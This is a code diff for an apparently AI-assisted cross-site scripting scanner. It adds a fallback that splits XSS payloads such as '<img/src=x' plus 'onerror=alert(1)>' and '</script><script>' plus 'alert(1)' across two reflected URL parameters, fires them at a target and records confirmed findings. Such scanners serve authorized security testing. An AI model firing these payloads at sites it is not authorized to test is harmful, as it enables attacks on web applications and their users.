@@ -113,6 +113,14 @@ class CloudPayloadPlan:
 
 
 @dataclass
+class CoordinatedPayloadAttempt:
+    """A bounded multi-parameter fallback attempt for split reflections."""
+    context_type: str
+    param_payloads: dict[str, str]
+    transform_name: str
+
+
+@dataclass
 class WorkerResult:
     """Returned by a worker to the orchestrator via the result queue."""
     url: str
@@ -402,6 +410,7 @@ def _run(
 
     injectable = [r for r in probe_results if r.is_injectable]
     reflected  = [r for r in probe_results if r.is_reflected]
+    coordinated_attempts = _coordinated_split_attempts(reflected)
 
     # ── Step 4: Parse target HTML once — reused by local/cloud model helpers ─
     from ai_xss_generator.parser import parse_target as _parse_target
@@ -450,7 +459,7 @@ def _run(
         ))
         return
 
-    if not injectable:
+    if not injectable and not coordinated_attempts:
         put_result(WorkerResult(
             url=url,
             status="no_reflection",
@@ -663,6 +672,32 @@ def _run(
                             context_confirmed = True
                             break
 
+        if not confirmed_findings and not _timed_out():
+            for attempt in coordinated_attempts:
+                if _timed_out():
+                    break
+                ordered_params = list(attempt.param_payloads.keys())
+                primary_param = ordered_params[0]
+                total_transforms_tried += 1
+                result = executor.fire(
+                    url=url,
+                    param_name=primary_param,
+                    payload=attempt.param_payloads[primary_param],
+                    all_params=flat_params,
+                    transform_name=attempt.transform_name,
+                    sink_url=sink_url,
+                    payload_overrides=attempt.param_payloads,
+                )
+                if result.confirmed:
+                    confirmed_findings.append(_make_coordinated_finding(
+                        url=url,
+                        probe_results=reflected,
+                        attempt=attempt,
+                        result=result,
+                        waf=waf_hint,
+                    ))
+                    break
+
     finally:
         executor.stop()
 
@@ -714,6 +749,39 @@ def _make_finding(
         cloud_escalated=cloud_escalated,
         ai_engine=ai_engine,
         ai_note=ai_note,
+    )
+
+
+def _make_coordinated_finding(
+    *,
+    url: str,
+    probe_results: list[Any],
+    attempt: CoordinatedPayloadAttempt,
+    result: Any,
+    waf: str | None,
+) -> ConfirmedFinding:
+    ordered_params = list(attempt.param_payloads.keys())
+    payload_summary = "\n".join(
+        f"{param}={attempt.param_payloads[param]}"
+        for param in ordered_params
+    )
+    return ConfirmedFinding(
+        url=url,
+        param_name="+".join(ordered_params),
+        context_type=attempt.context_type,
+        sink_context=attempt.context_type,
+        payload=payload_summary,
+        transform_name=attempt.transform_name,
+        execution_method=result.method,
+        execution_detail=(
+            f"Coordinated multi-parameter payload confirmed across {', '.join(ordered_params)}. "
+            f"{result.detail}"
+        ).strip(),
+        waf=waf,
+        surviving_chars=_coordinated_surviving_chars(probe_results, attempt.context_type),
+        fired_url=result.fired_url,
+        source="phase1_transform",
+        cloud_escalated=False,
     )
 
 
@@ -834,6 +902,91 @@ def _dom_hit_priority(hit: Any) -> tuple[int, str, str]:
         str(getattr(hit, "sink", "")),
         str(getattr(hit, "source_name", "")),
     )
+
+
+def _split_attempts_for_context(context_type: str, first_param: str, second_param: str) -> list[CoordinatedPayloadAttempt]:
+    attempts: list[CoordinatedPayloadAttempt] = []
+    if context_type in {"html_body", "html_comment"}:
+        attempts.extend([
+            CoordinatedPayloadAttempt(
+                context_type=context_type,
+                param_payloads={first_param: "<img/src=x", second_param: "onerror=alert(1)>"},
+                transform_name="split_img_onerror",
+            ),
+            CoordinatedPayloadAttempt(
+                context_type=context_type,
+                param_payloads={first_param: "<svg", second_param: "onload=alert(1)>"},
+                transform_name="split_svg_onload",
+            ),
+            CoordinatedPayloadAttempt(
+                context_type=context_type,
+                param_payloads={first_param: "<details/open", second_param: "ontoggle=alert(1)>"},
+                transform_name="split_details_toggle",
+            ),
+            CoordinatedPayloadAttempt(
+                context_type=context_type,
+                param_payloads={first_param: "<a/href=java", second_param: "script:alert(1)>x</a>"},
+                transform_name="split_href_scheme",
+            ),
+        ])
+    elif context_type in {"js_code", "js_string_dq", "js_string_sq", "js_string_bt", "json_value"}:
+        attempts.extend([
+            CoordinatedPayloadAttempt(
+                context_type=context_type,
+                param_payloads={first_param: "</script><script>", second_param: "alert(1)</script>"},
+                transform_name="split_script_breakout",
+            ),
+            CoordinatedPayloadAttempt(
+                context_type=context_type,
+                param_payloads={first_param: "</script><script>", second_param: "alert(1)//"},
+                transform_name="split_script_comment",
+            ),
+        ])
+    return attempts
+
+
+def _coordinated_split_attempts(probe_results: list[Any]) -> list[CoordinatedPayloadAttempt]:
+    context_to_params: dict[str, list[str]] = {}
+    for probe_result in probe_results:
+        seen_contexts: set[str] = set()
+        for reflection in getattr(probe_result, "reflections", []):
+            context_type = str(getattr(reflection, "context_type", "") or "")
+            if not context_type or context_type in seen_contexts:
+                continue
+            seen_contexts.add(context_type)
+            context_to_params.setdefault(context_type, []).append(probe_result.param_name)
+
+    attempts: list[CoordinatedPayloadAttempt] = []
+    seen: set[tuple[str, tuple[tuple[str, str], ...]]] = set()
+    for context_type, params in context_to_params.items():
+        unique_params: list[str] = []
+        for param in params:
+            if param not in unique_params:
+                unique_params.append(param)
+        if len(unique_params) < 2:
+            continue
+        for index, first_param in enumerate(unique_params):
+            for second_param in unique_params[index + 1:]:
+                for ordered_first, ordered_second in ((first_param, second_param), (second_param, first_param)):
+                    for attempt in _split_attempts_for_context(context_type, ordered_first, ordered_second):
+                        dedup_key = (
+                            attempt.context_type,
+                            tuple(sorted(attempt.param_payloads.items())),
+                        )
+                        if dedup_key in seen:
+                            continue
+                        seen.add(dedup_key)
+                        attempts.append(attempt)
+    return attempts
+
+
+def _coordinated_surviving_chars(probe_results: list[Any], context_type: str) -> str:
+    merged: set[str] = set()
+    for probe_result in probe_results:
+        for reflection in getattr(probe_result, "reflections", []):
+            if getattr(reflection, "context_type", "") == context_type:
+                merged.update(getattr(reflection, "surviving_chars", frozenset()))
+    return "".join(sorted(merged))
 
 
 def _build_dom_context(
